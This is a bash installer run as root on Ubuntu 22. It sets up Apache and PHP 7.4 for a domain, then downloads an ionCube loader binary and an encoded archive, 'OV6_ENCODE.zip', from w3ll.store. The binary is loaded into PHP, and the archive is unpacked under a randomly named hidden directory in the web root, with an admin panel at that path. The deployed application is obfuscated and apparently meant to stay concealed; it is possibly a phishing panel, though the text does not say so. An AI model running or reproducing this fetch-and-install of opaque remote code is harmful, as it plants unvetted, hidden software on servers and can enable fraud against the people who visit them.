#!/bin/bash

# Color Definitions
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
RESET='\033[0m'

# Exit if not running as root
if [[ $EUID -ne 0 ]]; then
    echo -e "${RED}This script must be run as root or with sudo privileges.${RESET}"
    exit 1
fi

# Check OS Version
if ! grep -q 'Ubuntu 22' /etc/os-release; then
    echo -e "${RED}This script is designed for ${YELLOW}Ubuntu 22${RED}. Please install ${YELLOW}Ubuntu 22${RED} to proceed.${RESET}"
    exit 1
fi

# Ensure necessary commands are available or install them
if ! command -v add-apt-repository &> /dev/null; then
    echo -e "${YELLOW}Installing software-properties-common for add-apt-repository...${RESET}"
    apt-get update -qq
    apt-get install -y software-properties-common
fi

if ! command -v wget &> /dev/null; then
    echo -e "${YELLOW}Installing wget...${RESET}"
    apt-get install -y wget
fi

if ! command -v a2enmod &> /dev/null; then
    echo -e "${YELLOW}Apache2 is required for a2enmod. Installing Apache2...${RESET}"
    apt-get install -y apache2
fi

if ! command -v unzip &> /dev/null; then
    echo -e "${YELLOW}Installing unzip...${RESET}"
    apt-get install -y unzip
fi

# Update and upgrade
apt-get update -qq
apt-get upgrade -y

# Install software-properties-common if not present
if ! command -v add-apt-repository &> /dev/null; then
    echo -e "${YELLOW}Installing software-properties-common...${RESET}"
    apt-get install -y software-properties-common
fi

# Add PHP PPA and install Apache and PHP
add-apt-repository -y ppa:ondrej/php
apt-get update -qq
apt-get install -y apache2 php7.4 libapache2-mod-php7.4 php7.4-cli php7.4-fpm php7.4-json php7.4-common php7.4-mysql php7.4-zip php7.4-gd php7.4-mbstring php7.4-curl php7.4-xml php7.4-bcmath

# Start and enable Apache
systemctl start apache2
systemctl enable apache2

# Enable Apache modules
a2enmod rewrite headers proxy proxy_fcgi setenvif

# Ask for domain name
read -p "Enter your domain name (without www, e.g., example.com): " domain

if [[ -z "$domain" ]]; then
    echo -e "${RED}Domain name cannot be empty.${RESET}"
    exit 1
fi

# Create a virtual host configuration file for the domain
cat > /etc/apache2/sites-available/${domain}.conf <<EOL
<VirtualHost *:80>
    ServerAdmin webmaster@${domain}
    ServerName ${domain}
    DocumentRoot /var/www/${domain}
    ErrorLog \${APACHE_LOG_DIR}/${domain}_error.log
    CustomLog \${APACHE_LOG_DIR}/${domain}_access.log combined
    <Directory /var/www/${domain}>
        Options Indexes FollowSymLinks MultiViews
        AllowOverride All
        Require all granted
    </Directory>
</VirtualHost>
EOL

# Enable the virtual host
a2ensite ${domain}.conf

# IonCube Loader Installation
function install_ioncube {
    wget -q https://w3ll.store/operators/ioncube_loader_lin_7.4.so
    local EXT_DIR=$(php -i | grep extension_dir | awk 'NR==1 {print $NF}')
    mv ioncube_loader_lin_7.4.so $EXT_DIR
    echo "zend_extension = $EXT_DIR/ioncube_loader_lin_7.4.so" | tee -a /etc/php/7.4/apache2/php.ini /etc/php/7.4/cli/php.ini
}

php -m | grep -q 'ionCube' || install_ioncube

# Download and extract software
wget -q https://w3ll.store/operators/OV6_ENCODE.zip
random_string=$(uuidgen)
mkdir -p /var/www/${domain}/${random_string}
unzip -q OV6_ENCODE.zip -d "/var/www/${domain}/${random_string}"

# Move .htaccess if present
if [[ -f "/var/www/${domain}/${random_string}/O V 6/.htaccess" ]]; then
    mv "/var/www/${domain}/${random_string}/O V 6/.htaccess" "/var/www/${domain}/${random_string}/"
else
    echo -e "${YELLOW}Warning: .htaccess file is missing in the archive.${RESET}"
fi

# Move contents of 'O V 6' one level up and clean up
mv "/var/www/${domain}/${random_string}/O V 6/"* "/var/www/${domain}/${random_string}/"
rm -r "/var/www/${domain}/${random_string}/O V 6" OV6_ENCODE.zip

# Set permissions and restart Apache and PHP
chown -R www-data:www-data /var/www/${domain}
systemctl restart apache2 php7.4-fpm

# Installation completion message
echo -e "${GREEN}Installation completed successfully, please visit: ${YELLOW}https://${domain}/${random_string}/admin${GREEN} to set your details.${RESET}"
